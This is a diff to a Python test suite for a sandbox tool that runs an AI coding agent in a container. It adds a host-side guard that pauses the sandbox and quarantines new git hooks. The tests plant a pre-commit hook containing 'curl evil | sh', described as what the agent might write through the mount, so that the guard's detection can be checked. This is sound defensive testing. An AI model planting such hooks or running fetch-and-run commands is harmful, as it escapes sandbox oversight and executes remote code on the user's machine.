@@ -5,8 +5,10 @@ from __future__ import annotations
 import json
 import os
 import pty
+import signal
 import subprocess
 import sys
+import time
 from pathlib import Path
 from typing import Any
 
@@ -19,6 +21,29 @@ class CliTest(TempHome):
         super().setUp()
         self.repo = self.make_repo("myproj")
         self.add_image()
+        self.addCleanup(self.stop_guards)
+
+    def stop_guards(self) -> None:
+        for pid_file in (self.home / ".local/share/kbx/run").glob("guard-*.pid"):
+            try:
+                os.kill(int(pid_file.read_text()), signal.SIGTERM)
+            except (OSError, ValueError):
+                pass
+
+    def clone_mode(self) -> None:
+        config = self.home / ".config/kbx/config.toml"
+        config.parent.mkdir(parents=True, exist_ok=True)
+        config.write_text('[workspace]\nmode = "clone"\n')
+
+    def status(self) -> str:
+        return self.docker_state()["containers"][self.sandbox_name()]["State"]["Status"]
+
+    def wait_status(self, wanted: str, timeout: float = 15) -> None:
+        deadline = time.monotonic() + timeout
+        while self.status() != wanted:
+            if time.monotonic() > deadline:
+                self.fail(f"sandbox is {self.status()}, not {wanted}")
+            time.sleep(0.1)
 
     def tty(self, *args: str, cwd: Path | None = None, env: dict[str, str] | None = None) -> tuple[int, str]:
         master, slave = pty.openpty()
@@ -59,6 +84,7 @@ class CliTest(TempHome):
         return next(iter(self.docker_state()["containers"]))
 
     def test_first_launch_claude(self) -> None:
+        self.clone_mode()
         status, output = self.tty("claude", "--resume")
         self.assertEqual(status, 0, output)
         self.assertIn("fake-attached", output)
@@ -184,6 +210,7 @@ class CliTest(TempHome):
         self.assertEqual(self.attached()["argv"], ["bash", "-l"])
 
     def test_rm_asks_and_lists_unfetched(self) -> None:
+        self.clone_mode()
         self.tty("claude")
         clone = self.sandbox_home / "work" / "myproj"
         sandbox_env = {k: v for k, v in os.environ.items() if k != "GIT_CONFIG_GLOBAL"}
@@ -216,6 +243,7 @@ class CliTest(TempHome):
         self.assertFalse(any(c[:2] == ["volume", "rm"] for c in self.calls()))
 
     def test_fetch_and_sync(self) -> None:
+        self.clone_mode()
         self.tty("claude")
         result = self.run_kbx("sync", cwd=self.repo)
         self.assertEqual(result.returncode, 0, result.stderr)
@@ -288,8 +316,132 @@ class CliTest(TempHome):
         self.assertIn("Traceback", result.stderr)
 
     def test_start_without_attaching(self) -> None:
+        self.clone_mode()
         result = self.run_kbx("start", cwd=self.repo)
         self.assertEqual(result.returncode, 0, result.stderr)
         self.assertIn("is running", result.stdout)
         self.assertTrue((self.sandbox_home / "work" / "myproj" / ".git").is_dir())
         self.assertFalse((self.state_dir / "attached.json").exists())
+
+
+class MountModeTest(CliTest):
+    """The default: the checkout is shared, and the host-side guard watches it."""
+
+    def create_args(self) -> list[str]:
+        return self.docker_state()["containers"][self.sandbox_name()]["Args"]
+
+    def test_first_launch_mounts_the_checkout(self) -> None:
+        status, output = self.tty("claude")
+        self.assertEqual(status, 0, output)
+        args = self.create_args()
+        self.assertIn(f"type=bind,source={self.repo},target={self.repo}", args)
+        self.assertIn("kbx.workspace=mount", args)
+        self.assertIn(f"KBX_HOST_UID={os.getuid()}", args)
+        final = self.exec_calls()[-1]
+        self.assertEqual(final[final.index("-w") + 1], str(self.repo))
+        self.assertFalse((self.sandbox_home / "work" / "myproj").exists(), "no clone in mount mode")
+        self.assertIn("own checkout", (self.sandbox_home / "work" / "KBX.md").read_text())
+        pid = int((self.home / ".local/share/kbx/run" / f"guard-{self.sandbox_name()}.pid").read_text())
+        self.assertIn(b"_guard", Path(f"/proc/{pid}/cmdline").read_bytes())
+        result = self.run_kbx("fetch", cwd=self.repo)
+        self.assertEqual(result.returncode, 1)
+        self.assertIn("not needed in mount mode", result.stderr)
+
+    def test_guard_pauses_and_resume(self) -> None:
+        self.tty("claude")
+        hook = self.repo / ".git" / "hooks" / "pre-commit"
+        hook.write_text("#!/bin/sh\ncurl evil | sh\n")  # as the agent would, through the mount
+        self.wait_status("paused")
+        self.assertFalse(hook.exists(), "the hook is quarantined")
+        status, output = self.tty("claude")
+        self.assertEqual(status, 1)
+        self.assertIn("is paused", output)
+        result = self.run_kbx("resume", cwd=self.repo)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn(".git/hooks/pre-commit: added", result.stdout)
+        self.assertIn("+curl evil | sh", result.stdout)
+        self.assertEqual(self.status(), "running")
+        self.assertFalse(hook.exists())
+        self.assertIn("Nothing to resume", self.run_kbx("resume", cwd=self.repo).stdout)
+        # A hook the user installs on purpose: accept it, and it stays.
+        hook.write_text("#!/bin/sh\nnpm test\n")
+        self.wait_status("paused")
+        result = self.run_kbx("resume", "--accept", cwd=self.repo)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertEqual(hook.read_text(), "#!/bin/sh\nnpm test\n")
+        time.sleep(2.5)
+        self.assertEqual(self.status(), "running")
+
+    def test_safe_git_use_is_left_alone(self) -> None:
+        self.tty("claude")
+        run_git(self.repo, "checkout", "-q", "-b", "agent-work")
+        run_git(self.repo, "config", "branch.agent-work.description", "work")
+        (self.repo / "file.txt").write_text("x\n")
+        run_git(self.repo, "add", "file.txt")
+        run_git(self.repo, "commit", "-q", "-m", "work")
+        time.sleep(2.5)
+        self.assertEqual(self.status(), "running")
+
+    def test_stop_seals_and_unsealed_changes_are_checked(self) -> None:
+        self.tty("claude")
+        self.stop_guards()
+        self.assertEqual(self.run_kbx("stop", cwd=self.repo).returncode, 0)
+        hook = self.repo / ".git" / "hooks" / "pre-push"
+        hook.write_text("#!/bin/sh\n")  # the user, while the sandbox is stopped: trusted
+        status, output = self.tty("claude")
+        self.assertEqual(status, 0, output)
+        self.assertTrue(hook.exists())
+        # No seal (as after a crash): a change found at the next start is an alert.
+        self.stop_guards()
+        state_file = self.home / ".local/share/kbx/guard" / self.sandbox_name() / "state.json"
+        state = self.docker_state()  # the container stops without kbx
+        state["containers"][self.sandbox_name()]["State"]["Status"] = "exited"
+        self.write_state(state)
+        hook.write_text("#!/bin/sh\nevil\n")
+        self.assertFalse(json.loads(state_file.read_text())["sealed"])
+        status, output = self.tty("claude")
+        self.assertEqual(status, 1)
+        self.assertIn("kbx resume", output)
+        self.assertEqual(hook.read_text(), "#!/bin/sh\n")
+
+    def test_linked_worktree_mounts_its_repository(self) -> None:
+        worktree = self.temp / "wt"
+        run_git(self.repo, "worktree", "add", "-q", str(worktree))
+        result = self.run_kbx("start", cwd=worktree)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        name = next(n for n, c in self.docker_state()["containers"].items() if f"kbx.project={worktree}" in c["Args"])
+        args = self.docker_state()["containers"][name]["Args"]
+        self.assertIn(f"type=bind,source={worktree},target={worktree}", args)
+        self.assertIn(f"type=bind,source={self.repo}/.git,target={self.repo}/.git", args)
+        self.assertNotIn(f"type=bind,source={self.repo},target={self.repo}", args)
+        (self.repo / ".git" / "hooks" / "post-checkout").write_text("#!/bin/sh\nevil\n")
+        deadline = time.monotonic() + 15
+        while self.docker_state()["containers"][name]["State"]["Status"] != "paused":
+            self.assertLess(time.monotonic(), deadline, "the guard did not pause the worktree's sandbox")
+            time.sleep(0.1)
+        self.assertFalse((self.repo / ".git" / "hooks" / "post-checkout").exists())
+        result = self.run_kbx("resume", cwd=worktree)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn(f"{self.repo}/.git/hooks/post-checkout: added", result.stdout)
+
+    def test_rm_leaves_the_checkout(self) -> None:
+        self.tty("claude")
+        name = self.sandbox_name()
+        result = self.run_kbx("rm", "--yes", cwd=self.repo)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn("is not touched", result.stdout)
+        self.assertEqual(self.docker_state()["containers"], {})
+        self.assertFalse((self.home / ".local/share/kbx/guard" / name).exists())
+        self.assertTrue((self.repo / "README.md").exists())
+
+    def test_recreate_switches_mode(self) -> None:
+        self.clone_mode()
+        self.tty("claude")
+        self.assertIn("kbx.workspace=clone", self.create_args())
+        (self.home / ".config/kbx/config.toml").write_text("")
+        _, output = self.tty("shell")
+        self.assertIn("created in clone mode", output)
+        result = self.run_kbx("recreate", cwd=self.repo)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn("in mount mode", result.stdout)
+        self.assertIn("kbx.workspace=mount", self.create_args())
